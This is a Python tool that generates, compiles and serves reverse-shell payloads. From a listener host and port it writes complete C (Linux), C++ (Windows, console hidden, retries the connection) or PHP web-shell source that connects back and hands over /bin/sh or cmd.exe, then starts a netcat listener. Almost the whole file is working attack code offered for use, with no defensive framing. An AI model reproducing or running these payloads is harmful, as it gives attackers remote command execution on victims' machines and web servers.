#!/usr/bin/python3

import os
from time import sleep
import sys
import subprocess

class bcolors:

    BLUE = '\033[94m'
    GREEN = '\033[92m'
    RED = '\033[31m'
    YELLOW = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    BGRED = '\033[41m'
    WHITE = '\033[37m'

banner = """
   ________  __    __    _______   ____     ____    _______   __    _____  ___   
  /"      ")/" |  | "\  /" __   ) /  " \   /  " \  |   _  "\ |" \  ( "   \|"  \  
 (:   //\_/(:  (__)  :)(__/ _) .//__|| |  /__|| |  (. |_)  :)||  | |.\    \    | 
  \___ \    \/      \/     /  //    |: |     |: |  |:     \/ |:  | |: \.   \   | 
  __ |  \   //  __   \  __ \_  \   _\  |    _\  |  (|  _  \  |.  | |.  \    \. | 
 /" \/  :) (:  (  )  :)(: \__) :\ /" \_|\  /" \_|\ |: |_)  :)/\  |\|    \    \ | 
(_______/   \__|  |__/  \_______)(_______)(_______)(_______/(__\_|_)\___|\____\) 
                                                                                 
"""

def init():
    print(bcolors.RED)    
    print(banner)
    print(bcolors.ENDC)
    print(bcolors.GREEN)
    text = "ReverseShell Binary Auto generater in C language\n\n"

    for i in text:
        print(i,end="",flush=True)
        sleep(0.02)

    del text
    print(bcolors.ENDC)
    if len(sys.argv) != 4:
        
        print(bcolors.RED)

        print("[!]More Args!!!!!!")
        print(f"[+]Usage: {sys.argv[0]} <lhost> <lport> <file_type>")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 elf")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 exe")
        print(f"[+]Example: {sys.argv[0]} 192.168.0.4 1337 php")
        print(bcolors.ENDC)
        
        sys.exit()

def host_and_port():
    lhost = sys.argv[1]
    lport = sys.argv[2]

    array = [lhost,lport]
    counter = 0

    for i in array:
        if len(i) > counter:
            counter = len(i)

    max_length = counter
    hatch = "+"+"-"*counter+"+"
    diff = max_length - len(lport)

    print(hatch)
    print(f"|{lhost}|<---LHOST")
    print(f"|{lport}"+" "*diff+"|<---LPORT")
    print(hatch)

    del array,counter,max_length,hatch,diff

    allow_range = [p for p in range(1,65536)]
    
    print(bcolors.RED)
    if int(lport) not in allow_range:
        print("[!]Invalid Number")
        print("[+]Port number: 1 - 65535")
        
        sys.exit()
    del allow_range
    return lhost,lport
    print(bcolors.ENDC)

def elf_write(lhost,lport):
    
    file_name = "shell.c"
    f = open(file_name,"w")
    f.write("#include <stdlib.h>\n")
    f.write("#include <unistd.h>\n")
    f.write("#include <netinet/in.h>\n")
    f.write("#include <arpa/inet.h>\n\n")
    f.write("int main(void){\n")
    f.write(f"int port = {int(lport)};\n")
    f.write("struct sockaddr_in revsockaddr;\n\n")
    f.write("int sockt = socket(AF_INET, SOCK_STREAM, 0);\n")
    f.write("revsockaddr.sin_family = AF_INET;\n")
    f.write("revsockaddr.sin_port = htons(port);\n")
    f.write(f"revsockaddr.sin_addr.s_addr = inet_addr(\"{lhost}\");\n\n")
    f.write("connect(sockt, (struct sockaddr *) &revsockaddr,\n")
    f.write("sizeof(revsockaddr));\n")
    f.write("dup2(sockt, 0);\n")
    f.write("dup2(sockt, 1);\n")
    f.write("dup2(sockt, 2);\n\n")
    f.write("char * const argv[] = {\"/bin/sh\", NULL};\n")
    f.write("execve(\"/bin/sh\", argv, NULL);\n\n")
    f.write("return 0;\n")
    f.write("}")
    f.close()
    
    print("[+]SourceCode Generated")


    del f
    return file_name


def exe_write(lhost,lport):

    file_name = "shell.cpp"
    f = open(file_name,"w")
    
    f.write("#include <winsock2.h>\n")
    f.write("#include <windows.h>\n")
    f.write("#include <ws2tcpip.h>\n")
    f.write("#pragma comment(lib, \"Ws2_32.lib\")\n")
    f.write("#define DEFAULT_BUFLEN 1024\n")

    f.write("void RunShell(char* C2Server, int C2Port) {\n")
    f.write("while(true) {\n")
    f.write("Sleep(5000);\n")

    f.write("SOCKET mySocket;\n")
    f.write("sockaddr_in addr;\n")
    f.write("WSADATA version;\n")
    f.write("WSAStartup(MAKEWORD(2,2), &version);\n")
    f.write("mySocket = WSASocket(AF_INET,SOCK_STREAM,IPPROTO_TCP, NULL, (unsigned int)NULL, (unsigned int)NULL);\n")
    f.write("addr.sin_family = AF_INET;\n")
   
    f.write("addr.sin_addr.s_addr = inet_addr(C2Server);\n")  
    f.write("addr.sin_port = htons(C2Port);\n")

    f.write("if (WSAConnect(mySocket, (SOCKADDR*)&addr, sizeof(addr), NULL, NULL, NULL, NULL)==SOCKET_ERROR) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("else {\n")
    f.write("char RecvData[DEFAULT_BUFLEN];\n")
    f.write("memset(RecvData, 0, sizeof(RecvData));\n")
    f.write("int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);\n")
    f.write("if (RecvCode <= 0) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("else {\n")
    f.write("char Process[] = \"\cmd.exe\\\";\n")
    f.write("STARTUPINFO sinfo;\n")
    f.write("PROCESS_INFORMATION pinfo;\n")
    f.write("memset(&sinfo, 0, sizeof(sinfo));\n")
    f.write("sinfo.cb = sizeof(sinfo);\n")
    f.write("sinfo.dwFlags = (STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW);\n")
    f.write("sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE) mySocket;\n")
    f.write("CreateProcess(NULL, Process, NULL, NULL, TRUE, 0, NULL, NULL, &sinfo, &pinfo);\n")
    f.write("WaitForSingleObject(pinfo.hProcess, INFINITE);\n")
    f.write("CloseHandle(pinfo.hProcess);\n")
    f.write("CloseHandle(pinfo.hThread);\n")

    f.write("memset(RecvData, 0, sizeof(RecvData));\n")
    f.write("int RecvCode = recv(mySocket, RecvData, DEFAULT_BUFLEN, 0);\n")
    f.write("if (RecvCode <= 0) {\n")
    f.write("closesocket(mySocket);\n")
    f.write("WSACleanup();\n")
    f.write("continue;\n")
    f.write("}\n")
    f.write("if (strcmp(RecvData, \"exit\\n\") == 0) {\n")
    f.write("exit(0);\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")
    f.write("}\n")

    f.write("int main(int argc, char **argv) {\n")
    f.write("FreeConsole();\n")
    f.write("if (argc == 3) {\n")
    f.write("int port  = atoi(argv[2]);\n") 
    f.write("RunShell(argv[1], port);\n")
    f.write("}\n")
    f.write("else {\n")
    f.write(f"char host[] = \"{lhost}\";\n")
    f.write(f"int port = {lport};//chnage this to your open port\n")
    f.write("RunShell(host, port);\n")
    f.write("}\n")
    f.write("return 0;\n")
    f.write("}\n")

    f.close()

    del f
    return file_name


def php_write(lhost,lport):

    file_name = "shell.php"
    f = open(file_name,"w")
   
    php_script = """

<?php

set_time_limit (0);
$VERSION = "1.0";
$ip = '{lhost}';  
$port = {lport};       
$chunk_size = 1400;
$write_a = null;
$error_a = null;
$shell = 'uname -a; w; id; /bin/sh -i';
$daemon = 0;
$debug = 0;


if (function_exists('pcntl_fork')) {
	$pid = pcntl_fork();
	
	if ($pid == -1) {
		printit("ERROR: Can't fork");
		exit(1);
	}
	
	if ($pid) {
		exit(0);  // Parent exits
	}

	if (posix_setsid() == -1) {
		printit("Error: Can't setsid()");
		exit(1);
	}

	$daemon = 1;
} else {
	printit("WARNING: Failed to daemonise.  This is quite common and not fatal.");
}

chdir("/");

umask(0);


$sock = fsockopen($ip, $port, $errno, $errstr, 30);
if (!$sock) {
	printit("$errstr ($errno)");
	exit(1);
}

$descriptorspec = array(
   0 => array("pipe", "r"),  // stdin is a pipe that the child will read from
   1 => array("pipe", "w"),  // stdout is a pipe that the child will write to
   2 => array("pipe", "w")   // stderr is a pipe that the child will write to
);

$process = proc_open($shell, $descriptorspec, $pipes);

if (!is_resource($process)) {
	printit("ERROR: Can't spawn shell");
	exit(1);
}

stream_set_blocking($pipes[0], 0);
stream_set_blocking($pipes[1], 0);
stream_set_blocking($pipes[2], 0);
stream_set_blocking($sock, 0);

printit("Successfully opened reverse shell to $ip:$port");

while (1) {
	// Check for end of TCP connection
	if (feof($sock)) {
		printit("ERROR: Shell connection terminated");
		break;
	}

	// Check for end of STDOUT
	if (feof($pipes[1])) {
		printit("ERROR: Shell process terminated");
		break;
	}

	// Wait until a command is end down $sock, or some
	// command output is available on STDOUT or STDERR
	$read_a = array($sock, $pipes[1], $pipes[2]);
	$num_changed_sockets = stream_select($read_a, $write_a, $error_a, null);

	// If we can read from the TCP socket, send
	// data to process's STDIN
	if (in_array($sock, $read_a)) {
		if ($debug) printit("SOCK READ");
		$input = fread($sock, $chunk_size);
		if ($debug) printit("SOCK: $input");
		fwrite($pipes[0], $input);
	}

	// If we can read from the process's STDOUT
	// send data down tcp connection
	if (in_array($pipes[1], $read_a)) {
		if ($debug) printit("STDOUT READ");
		$input = fread($pipes[1], $chunk_size);
		if ($debug) printit("STDOUT: $input");
		fwrite($sock, $input);
	}

	// If we can read from the process's STDERR
	// send data down tcp connection
	if (in_array($pipes[2], $read_a)) {
		if ($debug) printit("STDERR READ");
		$input = fread($pipes[2], $chunk_size);
		if ($debug) printit("STDERR: $input");
		fwrite($sock, $input);
	}
}

fclose($sock);
fclose($pipes[0]);
fclose($pipes[1]);
fclose($pipes[2]);
proc_close($process);

function printit ($string) {
	if (!$daemon) {
		print "$string\n";
	}
}

?> 


    """


    php_script = php_script.replace("{lhost}",lhost)
    php_script = php_script.replace("{lport}",lport)

    f.write(php_script)

    f.close()

    del f

    return file_name

def format_setting():

    file_type = sys.argv[3]
    
    if file_type == "elf":

        f_format = "elf"
        
    elif file_type == "exe":

        f_format = "exe"

    elif file_type == "php":

        f_format = "php"

    else:

        print("[!]Invalid Value")
        print(bcolors.ENDC)
        print("Valid: \"elf\" or \"exe\" or \"php\"")
        sys.exit()
    
    
    return f_format

def compile(file_name,f_format):

    if f_format == "elf":

        try:
            compile_cmd = subprocess.getoutput(f"gcc {file_name} -o shell ")
        
            if "not found" in compile_cmd:
                print("[!]Could not Use gcc")
                print(bcolors.ENDC)
                sys.exit()    

        except:
            print("[!]Execption Occured")
            print(bcolors.ENDC)
            sys.exit()

    elif f_format == "exe":

        try:
            compile_cmd = subprocess.getoutput(f"i686-w64-mingw32-g++ {file_name} -o shell.exe -lws2_32 -lwininet -s -ffunction-sections -fdata-sections -Wno-write-strings -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc")

            if "not found" in compile_cmd:
                print("[!]Could not Use mingw")
                print(bcolors.ENDC)
                sys.exit()
        except:
            print("[!]Exception Occured")
            sys.exit()

    elif f_format == "php":

        print(f"{file_name} ---> generated")

    print("[+]Compile....Done")
    print(bcolors.ENDC)

def listener(lport):
    try:
        os.system(f"rlwrap nc -lnvp {lport}")
    except:
        os.system(f"nc -lnvp {lport}")

if __name__ == "__main__":

    init()
    lhost,lport = host_and_port()
    f_format = format_setting()

    if f_format == "elf":
        file_name = elf_write(lhost,lport) 

    elif f_format == "exe":
        file_name = exe_write(lhost,lport)

    elif f_format == "php":
        file_name = php_write(lhost,lport)

    compile(file_name,f_format)
    listener(lport)
